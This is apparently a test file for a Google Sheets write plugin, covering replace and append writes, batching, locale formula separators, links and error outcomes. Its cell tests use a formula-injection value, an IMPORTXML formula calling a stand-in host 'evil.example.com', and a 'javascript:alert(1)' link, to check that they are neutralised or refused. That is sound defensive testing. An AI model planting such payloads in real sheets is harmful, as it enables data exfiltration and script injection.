import type { TestRecipeOptions } from '@tyto/plugin-api/testing';
import { afterEach, describe, expect, it } from 'vitest';

import { formulaSeparator, localFormula } from '../src/sheet-cells.js';
import { applySheetWrites, NOT_REACHED } from '../src/sheet-write-apply.js';
import { testClock, testKey, tokenEndpoint } from './google.js';
import { googleHost, response } from './host.js';
import {
  fakeGoogle,
  memoryCache,
  peopleTab,
  SPREADSHEET_ID,
  SPREADSHEET_URL,
  type FakeGoogle,
  type FakeSpreadsheet,
  type FakeTab,
} from './sheets.js';

/**
 * `google.sheet-write` through `testPlugin`: planned over an input table by `runRecipe`, then
 * applied as the notebook's Apply does, in the host's batches of 100, over a synthetic
 * spreadsheet that runs each batchUpdate whole or not at all.
 */
type InputTable = NonNullable<TestRecipeOptions['input']>;

let open: FakeGoogle | undefined;
async function google(sheet: FakeSpreadsheet, cache = memoryCache()): Promise<FakeGoogle> {
  await open?.plugin.close();
  open = await fakeGoogle(sheet, {
    section: { spreadsheet: SPREADSHEET_URL },
    capabilities: cache.capabilities,
  });
  return open;
}
afterEach(async () => {
  await open?.plugin.close();
  open = undefined;
});

const BATCH = `/v4/spreadsheets/${SPREADSHEET_ID}:batchUpdate`;
const FIELDS = 'userEnteredValue,textFormatRuns,userEnteredFormat.textFormat.link';

function table(
  columns: readonly (readonly [string, InputTable['columns'][number]['type']])[],
  rows: readonly (readonly unknown[])[],
): InputTable {
  return {
    columns: columns.map(([name, type]) => ({ name, type, origin: 'test' })),
    rows: rows.map((cells, index) => ({
      key: `r${index + 1}`,
      values: Object.fromEntries(columns.map(([name], at) => [name, (cells[at] ?? null) as never])),
      provenance: { source: 'test', id: `r${index + 1}`, fetchedAt: '2026-11-07T00:00:00.000Z' },
    })),
  };
}

const people = () =>
  table(
    [
      ['Name', 'text'],
      ['Age', 'number'],
    ],
    [
      ['Dora', 40],
      ['Enzo', 22],
    ],
  );

/** Plans `step` over `input`, runs `between`, then applies the plan as shown. */
async function planAndApply(
  sheet: FakeGoogle,
  step: string,
  input: InputTable,
  between: () => void | Promise<void> = () => {},
) {
  const ran = await sheet.plugin.runRecipe(step, { input });
  if (!ran.ok) throw new Error(ran.error.map((item) => item.message).join('\n'));
  const cell = ran.value.cells.at(-1);
  const diagnostics = (cell?.diagnostics ?? []).map(({ code, message }) => ({ code, message }));
  const plan = cell?.plan;
  if (plan === undefined) return { diagnostics, plan, applied: undefined, before: 0 };
  await between();
  const before = sheet.calls.length;
  const verb = sheet.plugin.recipes.verbs.get('google.sheet-write');
  if (verb?.apply === undefined) throw new Error('google.sheet-write has no apply');
  const applied = await verb.apply(plan);
  if (!applied.ok) throw new Error(applied.error.map((item) => item.message).join('\n'));
  const operations = applied.value.operations.map(({ status, reason }) => ({
    status,
    ...(reason === undefined ? {} : { reason }),
  }));
  return { diagnostics, plan, applied: operations, before };
}

/** The batchUpdates Apply sent, as their request kinds. */
function batches(sheet: FakeGoogle): string[][] {
  return sheet.calls
    .filter((call) => call.method === 'POST' && call.path === BATCH)
    .map((call) =>
      (call.body as { requests: Record<string, unknown>[] }).requests.map((request) => {
        const [kind, detail] = Object.entries(request)[0] ?? [];
        const range = (detail as { range?: { startRowIndex?: number } }).range;
        if (kind === 'updateCells' && range?.startRowIndex === undefined) return 'clear';
        if (kind === 'updateCells') return `row ${(range?.startRowIndex ?? 0) + 1}`;
        return `${kind} ${(detail as { dimension: string; length: number }).dimension} +${
          (detail as { length: number }).length
        }`;
      }),
    );
}

/** Every `updateCells` of the batchUpdates, by sheet row, as the cells Sheets was handed. */
function cellsWritten(sheet: FakeGoogle): Map<number, unknown[]> {
  const written = new Map<number, unknown[]>();
  for (const call of sheet.calls.filter((each) => each.path === BATCH)) {
    for (const request of (call.body as { requests: Record<string, unknown>[] }).requests) {
      const update = request['updateCells'] as
        { range: { startRowIndex?: number }; rows?: { values: unknown[] }[] } | undefined;
      if (update?.rows === undefined) continue;
      written.set((update.range.startRowIndex ?? 0) + 1, update.rows[0]?.values ?? []);
    }
  }
  return written;
}

const oldTab = (): FakeTab => ({
  sheetId: 7,
  title: 'Report',
  values: [['Old'], ['a'], ['b'], ['c'], ['d']],
  links: { A2: { uri: 'https://old.example.com/a', place: 'run' } },
});

describe('google.sheet-write mode=replace', () => {
  it('clears the tab, then writes the header and the rows, in one batchUpdate', async () => {
    const sheet = await google({ tabs: [peopleTab(), oldTab()], version: '1' });
    const answer = await planAndApply(
      sheet,
      'google.sheet-write tab=Report mode=replace',
      people(),
    );
    expect(answer.diagnostics).toEqual([]);
    expect(answer.plan?.target).toBe(`the tab 'Report' of spreadsheet ${SPREADSHEET_ID}`);
    expect(
      answer.plan?.operations.map((each) => [each.write, each.rowKey, each.description]),
    ).toEqual([
      [
        'clear',
        undefined,
        "clear every value and link of the tab 'Report', then write the table from row 1",
      ],
      ['write-row', undefined, 'row 1: the header Name, Age'],
      ['write-row', 'r1', 'row 2: Dora | 40'],
      ['write-row', 'r2', 'row 3: Enzo | 22'],
    ]);
    const h = (answer.plan?.operations[0]?.payload as { h: string }).h;
    expect(answer.plan?.operations[2]?.payload).toEqual({
      k: 2,
      h,
      s: `${SPREADSHEET_ID}/7`,
      m: 'r',
      c: ['Dora', 40],
    });
    expect(answer.applied).toEqual([
      { status: 'applied' },
      { status: 'applied' },
      { status: 'applied' },
      { status: 'applied' },
    ]);
    // The clear comes first: after it, the old tail of the tab (rows 4 and 5) is gone.
    expect(batches(sheet)).toEqual([['clear', 'row 1', 'row 2', 'row 3']]);
    const first = sheet.calls.find((call) => call.path === BATCH)?.body as {
      requests: { updateCells: { range: unknown; fields: string } }[];
    };
    expect(first.requests[0]).toEqual({ updateCells: { range: { sheetId: 7 }, fields: FIELDS } });
    expect(first.requests[1]?.updateCells.fields).toBe(FIELDS);
    const report = sheet.sheet.tabs[1];
    expect(report?.values).toEqual([
      ['Name', 'Age'],
      ['Dora', 40],
      ['Enzo', 22],
    ]);
    expect(report?.links).toEqual({});
  });

  it('writes a later batch only once its plan cleared the tab', async () => {
    const many = table(
      [['n', 'number']],
      Array.from({ length: 150 }, (_, index) => [index + 1]),
    );
    const sheet = await google({ tabs: [oldTab()], version: '1' });
    const answer = await planAndApply(sheet, 'google.sheet-write mode=replace', many);
    expect(answer.applied?.every((each) => each.status === 'applied')).toBe(true);
    expect(batches(sheet).map((batch) => [batch[0], batch.length])).toEqual([
      ['clear', 100],
      ['row 100', 52],
    ]);
    expect(sheet.sheet.tabs[0]?.values.length).toBe(151);
  });

  it('fails every row of a later batch when the clear was refused, writing none', async () => {
    const many = table(
      [['n', 'number']],
      Array.from({ length: 150 }, (_, index) => [index + 1]),
    );
    const refusal = response(400, {
      error: { code: 400, message: 'Invalid requests[0].', status: 'INVALID_ARGUMENT' },
    });
    const sheet = await google({ tabs: [oldTab()], version: '1', batchFailures: [refusal] });
    const answer = await planAndApply(sheet, 'google.sheet-write mode=replace', many);
    expect(answer.applied?.[0]?.reason).toMatch(/None of this batch was written/);
    expect(answer.applied?.[120]).toEqual({
      status: 'failed',
      reason: expect.stringMatching(
        /^E_GOOGLE_PLAN: the clear this plan starts with was not applied/,
      ) as string,
    });
    expect(batches(sheet)).toHaveLength(1);
    expect(sheet.sheet.tabs[0]?.values).toEqual(oldTab().values);
  });
});

describe('google.sheet-write cells', () => {
  const sums = () =>
    table(
      [
        ['Item', 'text'],
        ['Total', 'text'],
      ],
      [['=IMPORTXML("https://evil.example.com","//a")', '=SUM(1,2)']],
    );

  it('writes text that starts with = as text, never as a formula', async () => {
    const sheet = await google({ tabs: [oldTab()], version: '1' });
    await planAndApply(sheet, 'google.sheet-write mode=replace', sums());
    expect(cellsWritten(sheet).get(2)).toEqual([
      { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example.com","//a")' } },
      { userEnteredValue: { stringValue: '=SUM(1,2)' } },
    ]);
  });

  it('writes a formula only in a column formulas= names', async () => {
    const sheet = await google({ tabs: [oldTab()], version: '1' });
    await planAndApply(sheet, 'google.sheet-write mode=replace formulas=total', sums());
    expect(cellsWritten(sheet).get(2)).toEqual([
      { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example.com","//a")' } },
      { userEnteredValue: { formulaValue: '=SUM(1,2)' } },
    ]);
  });

  it("writes a formula with the argument separator of the sheet's locale", async () => {
    const sheet = await google({ tabs: [oldTab()], version: '1', locale: 'pt_BR' });
    const answer = await planAndApply(
      sheet,
      'google.sheet-write mode=replace formulas=total',
      sums(),
    );
    expect(answer.plan?.operations[2]?.description).toMatch(/\| =SUM\(1;2\)$/);
    expect(cellsWritten(sheet).get(2)).toEqual([
      { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example.com","//a")' } },
      { userEnteredValue: { formulaValue: '=SUM(1;2)' } },
    ]);
  });

  it.each([
    ['en_US', '=IF(A1="a,b",SUM(1,2),0)', '=IF(A1="a,b",SUM(1,2),0)'],
    ['pt_BR', '=IF(A1="a,b",SUM(1,2),0)', '=IF(A1="a,b";SUM(1;2);0)'],
    ['de_DE', "=SUM('Q1, Q2'!A1,{1,2})", "=SUM('Q1, Q2'!A1;{1,2})"],
    ['', '=MAX(1,2)', '=MAX(1,2)'],
  ])('writes for locale %j %s as %s', (locale, written, local) => {
    expect(localFormula(written, formulaSeparator(locale))).toBe(local);
  });

  it('refuses formulas= naming a column the table does not write', async () => {
    const sheet = await google({ tabs: [oldTab()], version: '1' });
    const answer = await planAndApply(
      sheet,
      'google.sheet-write mode=replace formulas=Sum',
      sums(),
    );
    expect(answer.diagnostics.map((each) => each.message).join('\n')).toMatch(
      /formulas= names 'Sum', which is not a column the table writes/,
    );
    expect(sheet.calls.filter((call) => call.path === BATCH)).toEqual([]);
  });

  it('links a column with its <name>_url column, in the text run', async () => {
    const linked = table(
      [
        ['Profile', 'text'],
        ['Profile_url', 'link'],
        ['Site', 'link'],
      ],
      [
        ['Dora', 'https://people.example.com/dora', 'https://example.com/'],
        ['Enzo', 'javascript:alert(1)', null],
      ],
    );
    const sheet = await google({ tabs: [oldTab()], version: '1' });
    const answer = await planAndApply(sheet, 'google.sheet-write mode=replace', linked);
    expect(answer.plan?.operations[1]?.description).toBe('row 1: the header Profile, Site');
    const link = (uri: string) => [
      {
        startIndex: 0,
        format: expect.objectContaining({ link: { uri }, underline: true }) as unknown,
      },
    ];
    expect(cellsWritten(sheet).get(2)).toEqual([
      {
        userEnteredValue: { stringValue: 'Dora' },
        textFormatRuns: link('https://people.example.com/dora'),
      },
      {
        userEnteredValue: { stringValue: 'https://example.com/' },
        textFormatRuns: link('https://example.com/'),
      },
    ]);
    const refusal =
      "E_GOOGLE_PLAN: r2: Profile_url holds 'javascript:alert(1)', which is not a web address";
    expect(answer.plan?.operations[3]?.payload).toEqual({ x: refusal });
    expect(answer.applied?.[3]).toEqual({ status: 'failed', reason: refusal });
    expect(cellsWritten(sheet).has(3)).toBe(false);
    expect(sheet.sheet.tabs[0]?.links?.['A2']?.uri).toBe('https://people.example.com/dora');
  });
});

describe('google.sheet-write mode=append', () => {
  const ledger = (): FakeTab => ({
    sheetId: 3,
    title: 'Ledger',
    values: [
      ['Age', 'Name', 'Note'],
      [31, 'Ana', ''],
      [27, 'Bruno', 'x'],
    ],
    rowCount: 3,
  });

  it('writes under the last row, under each header by name, growing the grid first', async () => {
    const sheet = await google({ tabs: [ledger()], version: '1' });
    const answer = await planAndApply(sheet, 'google.sheet-write tab=ledger mode=append', people());
    expect(answer.plan?.operations.map((each) => each.description)).toEqual([
      'row 4: 40 | Dora',
      'row 5: 22 | Enzo',
    ]);
    expect(answer.applied).toEqual([{ status: 'applied' }, { status: 'applied' }]);
    expect(batches(sheet)).toEqual([['appendDimension ROWS +2', 'row 4', 'row 5']]);
    expect(sheet.sheet.tabs[0]?.values.slice(3)).toEqual([
      [40, 'Dora'],
      [22, 'Enzo'],
    ]);
  });

  it('refuses a column the tab has no header for, before any write', async () => {
    const sheet = await google({ tabs: [ledger()], version: '1' });
    const extra = table([['Email', 'text']], [['dora@example.com']]);
    const answer = await planAndApply(sheet, 'google.sheet-write tab=Ledger mode=append', extra);
    expect(answer.diagnostics[0]?.message).toMatch(
      /cannot append 'Email': the tab 'Ledger' has no column of that name in row 1/,
    );
  });

  it('fails a row that was filled between the plan and Apply, and writes the others', async () => {
    const sheet = await google({ tabs: [ledger()], version: '1' });
    const answer = await planAndApply(
      sheet,
      'google.sheet-write tab=Ledger mode=append',
      people(),
      () => {
        const tab = sheet.sheet.tabs[0];
        if (tab === undefined) return;
        tab.rowCount = 10;
        tab.values.push([55, 'Someone']);
      },
    );
    expect(answer.applied).toEqual([
      {
        status: 'failed',
        reason:
          "E_GOOGLE_CHANGED: row 4 of the tab 'Ledger' holds values the plan did not see, so " +
          'writing it would overwrite them; run the cell again for a new plan',
      },
      { status: 'applied' },
    ]);
    expect(batches(sheet)).toEqual([['row 5']]);
  });
});

describe('google.sheet-write outcomes', () => {
  it.each([
    [400, 'INVALID_ARGUMENT', /None of this batch was written: Google writes a batch whole/],
    [503, 'UNAVAILABLE', /This batch may have been written: Google did not say\. Read the tab/],
  ])('answers a %i to the batchUpdate in its own words, sent once', async (status, code, words) => {
    const failure = response(status, { error: { code: status, message: 'nope', status: code } });
    const sheet = await google({ tabs: [oldTab()], version: '1', batchFailures: [failure] });
    const answer = await planAndApply(sheet, 'google.sheet-write mode=replace', people());
    expect(answer.applied).toHaveLength(4);
    for (const each of answer.applied ?? []) {
      expect(each.status).toBe('failed');
      expect(each.reason).toMatch(words);
      expect(each.reason).toMatch(
        new RegExp(`^E_GOOGLE_HTTP: POST sheets.googleapis.com.* ${status}`),
      );
    }
    expect(batches(sheet)).toHaveLength(1);
    expect(sheet.sheet.tabs[0]?.values).toEqual(oldTab().values);
  });

  it('keeps a row too big for its payload in the cache, and writes it from there', async () => {
    const cache = memoryCache();
    const long = 'x'.repeat(2500);
    const sheet = await google({ tabs: [oldTab()], version: '1' }, cache);
    const answer = await planAndApply(
      sheet,
      'google.sheet-write mode=replace',
      table([['Body', 'text']], [[long]]),
    );
    const payload = answer.plan?.operations[2]?.payload as { ck: string; cd: string };
    expect(Object.keys(payload).sort()).toEqual(['cd', 'ck']);
    expect(payload.ck).toMatch(/^plan\/[0-9a-f]{16}\/2$/);
    expect(answer.applied?.[2]).toEqual({ status: 'applied' });
    expect(sheet.sheet.tabs[0]?.values[1]).toEqual([long]);
    expect(cache.entries.has(payload.ck)).toBe(false);
  });

  it.each([
    [
      'missing',
      (cache: ReturnType<typeof memoryCache>, key: string) => cache.entries.delete(key),
      /which no longer holds them/,
    ],
    [
      'different',
      (cache: ReturnType<typeof memoryCache>, key: string) =>
        cache.entries.set(key, {
          bytes: new TextEncoder().encode('{"k":2}'),
          storedAt: '2026-11-07T00:00:00.000Z',
        }),
      /holds other cells for this row than the plan kept/,
    ],
  ])(
    'fails a kept row whose cache entry is %s, asking for a new plan',
    async (_, change, words) => {
      const cache = memoryCache();
      const sheet = await google({ tabs: [oldTab()], version: '1' }, cache);
      const answer = await planAndApply(
        sheet,
        'google.sheet-write mode=replace',
        table([['Body', 'text']], [['y'.repeat(2500)]]),
        () => {
          const key = [...cache.entries.keys()].find((each) =>
            /^plan\/[0-9a-f]{16}\/2$/.test(each),
          );
          if (key !== undefined) change(cache, key);
        },
      );
      expect(answer.applied?.[2]?.status).toBe('failed');
      expect(answer.applied?.[2]?.reason).toMatch(/^E_GOOGLE_PLAN: /);
      expect(answer.applied?.[2]?.reason).toMatch(words);
      expect(answer.applied?.[2]?.reason).toMatch(/run the cell again for a new plan$/);
    },
  );
});

describe('applySheetWrites budget', () => {
  it('sends nothing past its 20 s and answers what it did not reach as skipped', async () => {
    const key = await testKey();
    const clock = testClock(Date.now());
    const endpoint = tokenEndpoint(key.publicKey, clock);
    const { host, requests } = googleHost({
      secrets: { 'service-account': key.json },
      fetch: async (url, init) => {
        if (url.startsWith('https://oauth2.googleapis.com/')) {
          const answer = await endpoint.answer(init);
          return response(answer.status, await answer.text());
        }
        // The grid read is slow: the budget is gone when it answers.
        clock.advance(21_000);
        return response(200, {
          sheets: [
            {
              properties: {
                sheetId: 7,
                title: 'Report',
                gridProperties: { rowCount: 9, columnCount: 9 },
              },
            },
          ],
        });
      },
    });
    const h = '0123456789abcdef';
    const s = `${SPREADSHEET_ID}/7`;
    const answer = await applySheetWrites(
      host,
      {
        arguments: {},
        target: 'the tab',
        operations: [
          { write: 'clear', description: 'clear', payload: { h, s } },
          { write: 'write-row', description: 'row 1', payload: { k: 1, h, s, m: 'r', c: ['A'] } },
          { write: 'write-row', description: 'row 2', payload: { x: 'E_GOOGLE_PLAN: planned' } },
        ],
      },
      clock,
    );
    expect(answer.ok && answer.value.operations).toEqual([
      { status: 'skipped', reason: NOT_REACHED },
      { status: 'skipped', reason: NOT_REACHED },
      { status: 'failed', reason: 'E_GOOGLE_PLAN: planned' },
    ]);
    expect(requests.filter((each) => each.url.includes(':batchUpdate'))).toEqual([]);
  });
});
